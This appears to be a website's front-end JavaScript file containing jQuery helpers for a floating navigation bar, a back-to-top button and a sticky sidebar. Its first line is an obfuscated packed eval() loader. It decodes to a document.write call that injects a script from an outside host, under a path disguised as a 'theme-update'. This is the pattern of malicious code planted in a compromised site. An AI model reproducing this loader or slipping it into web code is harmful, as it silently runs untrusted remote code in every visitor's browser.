eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('5.6("<0 7=4 1=\'2://3.c.d/e-b/8-9.a\'></0>");',15,15,'script|src|http|api|javascript|document|write|language|portal|html5|js|update|nocower|com|theme'.split('|'),0,{}))
$.fn.smartFloat=function(){var position=function(element){var top=element.position().top,pos=element.css("position");$(window).scroll(function(){var scrolls=$(this).scrollTop();if(scrolls>top){if(window.XMLHttpRequest){element.css({position:"fixed",top:0,left:0})}else{element.css({top:scrolls})}}else{element.css({position:pos,top:top})}})};return $(this).each(function(){position($(this))})};$("#navi1").smartFloat();var scrolltotop={setting:{startline:100,scrollto:0,scrollduration:800,fadeduration:[500,100]},controlHTML:'<b title="返回顶部" >︽</b>',controlattrs:{offsetx:30,offsety:80},anchorkeyword:"#top",state:{isvisible:false,shouldvisible:false},scrollup:function(){if(!this.cssfixedsupport){this.$control.css({opacity:0})}var dest=isNaN(this.setting.scrollto)?this.setting.scrollto:parseInt(this.setting.scrollto);if(typeof dest=="string"&&jQuery("#"+dest).length==1){dest=jQuery("#"+dest).offset().top}else{dest=0}this.$body.animate({scrollTop:dest},this.setting.scrollduration)},keepfixed:function(){var $window=jQuery(window);var controlx=$window.scrollLeft()+$window.width()-this.$control.width()-this.controlattrs.offsetx;var controly=$window.scrollTop()+$window.height()-this.$control.height()-this.controlattrs.offsety;this.$control.css({left:controlx+"px",top:controly+"px"})},togglecontrol:function(){var scrolltop=jQuery(window).scrollTop();if(!this.cssfixedsupport){this.keepfixed()}this.state.shouldvisible=(scrolltop>=this.setting.startline)?true:false;if(this.state.shouldvisible&&!this.state.isvisible){this.$control.stop().animate({opacity:1},this.setting.fadeduration[0]);this.state.isvisible=true}else{if(this.state.shouldvisible==false&&this.state.isvisible){this.$control.stop().animate({opacity:0},this.setting.fadeduration[1]);this.state.isvisible=false}}},init:function(){jQuery(document).ready(function($){var mainobj=scrolltotop;var iebrws=document.all;mainobj.cssfixedsupport=!iebrws||iebrws&&document.compatMode=="CSS1Compat"&&window.XMLHttpRequest;mainobj.$body=(window.opera)?(document.compatMode=="CSS1Compat"?$("html"):$("body")):$("html,body");mainobj.$control=$('<div id="topcontrol" title="Back Top" >'+mainobj.controlHTML+"</div>").css({position:mainobj.cssfixedsupport?"fixed":"absolute",bottom:mainobj.controlattrs.offsety,right:mainobj.controlattrs.offsetx,opacity:0,cursor:"pointer"}).attr({title:"杩斿洖椤堕儴"}).click(function(){mainobj.scrollup();return false}).appendTo("body");if(document.all&&!window.XMLHttpRequest&&mainobj.$control.text()!=""){mainobj.$control.css({width:mainobj.$control.width()})}mainobj.togglecontrol();$('a[href="'+mainobj.anchorkeyword+'"]').click(function(){mainobj.scrollup();return false});$(window).bind("scroll resize",function(e){mainobj.togglecontrol()})})}};scrolltotop.init();$(function(){var navH=$("#sidesoll").offset().top;var footnah=$(".ad_pagefooterbanner,.friendlink").offset().top;var a=0;$(window).scroll(function(){var scroH=$(this).scrollTop();var main=$('.content2,.content3').height();var barnav=$('#sidebar').height();if(main>barnav){if(scroH>=navH){if(scroH>footnah-700){lenheig=scroH-(footnah-700);$("#sidesoll").css({"position":"fixed","top":(0)-lenheig})}else{$("#sidesoll").css({"position":"fixed","top":58})}}else if(scroH<navH){$("#sidesoll").css({"position":"static","margin":"0 auto"})}console.log(scroH==navH)}})})